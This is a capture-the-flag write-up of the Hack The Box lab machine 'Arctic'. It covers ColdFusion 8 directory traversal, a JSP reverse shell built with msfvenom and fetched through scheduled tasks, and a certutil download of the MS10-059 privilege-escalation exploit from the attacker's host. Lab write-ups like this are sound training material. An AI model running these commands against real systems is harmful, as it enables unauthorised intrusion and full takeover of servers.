---
title: Arctic Hackthebox Writeup
date: 2020-12-22 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [windows,coldfusion,coldfusion8,directory traversal,jsp shell,java,msfvenom,windows exploit suggester]     # TAG names should always be lowercase
image: /assets/img/arctic-hackthebox/arctic-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Access:~$


Column | Details
------------ | -------------
Name | Arctic
IP | 10.10.10.11
Points | 20
Os | Windows
Difficult | Easy
Creator | [ch4p](https://www.hackthebox.eu/home/users/profile/1)
Out on | 22nd March 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* Exploiting `Coldfusion8` for *directory traversal* and getting the credentials to login as **Admin**.
* Loging into the dashboard and uploading a `jsp` shell to get a reverse connection back using *Scheduled tasks* functionality.
* Escalating `Privileges` by using **Local windows exploit suggester**, which gave `MS10-059.exe` as one of the recommendations.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/arctic-hackthebox/nmap-scan-1.png)

Basically `3 Ports` are open i.e. `135,8500,49154`. I found this about port *8500* on the internet:

___
![](/assets/img/arctic-hackthebox/port-8500-cold-fusion-2-tcp.png)

It runs `Adobe Coldfusion` on tcp port.

Accessing `port 8500`, I found this:

___
![](/assets/img/arctic-hackthebox/accessing-port-8500-3.png)

Exploring `/CFIDE` directory

___
![](/assets/img/arctic-hackthebox/CFIDE-directory-port-8500-access-4.png)

We finally got a admin page on **http://10.10.10.11:8500/CFIDE/administrator/enter.cfm**

___
![](/assets/img/arctic-hackthebox/admin-page-access-5.png)

Searching for some vulnerabilites on `Coldfusion8`, I found a [directory traversal vulnerability](https://www.exploit-db.com/exploits/14641)

___
![](/assets/img/arctic-hackthebox/cold-fusion-8-exploitdb-6.png)

Running the above exploit as explained, I got the `password hash` for the administrator.

___
![](/assets/img/arctic-hackthebox/got-password-for-traversal-8.png)

Running it on an online decrypter, I got the password as `happyday`.

___
![](/assets/img/arctic-hackthebox/we-got-this-encrypted-value-9.png)

I googled a bit and found that `Scheduled tasks` can be inititated from the **coldfusion8** dashboard.

___
![](/assets/img/arctic-hackthebox/scheduled-tasks-creating-a-new-task-10.png)

As it shows *Java and JVM*, so I thought to upload a `jsp shell`.

Creating payload using `msfvenom`.

**Command** : *msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > reverse.jsp*

___
![](/assets/img/arctic-hackthebox/creating-msfvenom-payload-23.png)

Hosting it on my machine using `Python server`.

**Hosting**: *python3 -m http.server 8081*

Using URL as `http://10.10.X.X:8081/reverse.jsp` --> *To download it on the windows machine.*

Saving the **Output file as** : `C:\ColdFusion8\wwwroot\CFIDE\shell.jsp`

Make sure to fill the **User Name** and **Password** field while scheduling the task.

*User Name:* `admin` *Password:* `happyday`

___
![])(/assets/img/arctic-hackthebox/shell-page-new-24.png)

Now running the `Scheduled task`.

___
![](/assets/img/arctic-hackthebox/running-scheduled-task-25.png)

Accessing the shell on `http://10.10.10.11:8500/CFIDE/shell.jsp` and listeing on the specified port, we got `User shell`.

___
![](/assets/img/arctic-hackthebox/got-shell-26.png)

Let's gather `systeminfo` for Privilege Escalation.

___
![](/assets/img/arctic-hackthebox/copy-system-info-27.png)

Feeding the above information to `windows exploit suggester` which I had downloaded on my machine.

Download link : [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

___
![](/assets/img/arctic-hackthebox/windows-exploit-suggester-28.png)

Using `MS10-059.exe` to escalate privileges.

[Download Link](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)

Sending the executable to windows machine using `certutil` command.

**Command**: `certutil -urlcache -split -f http://10.10.X.X:8081/MS10-059.exe priv.exe`

___
![](/assets/img/arctic-hackthebox/ms-10-059-exe-30.png)

Running the `exploit`, and we got `Root`.

___
![](/assets/img/arctic-hackthebox/got-root-31.png)
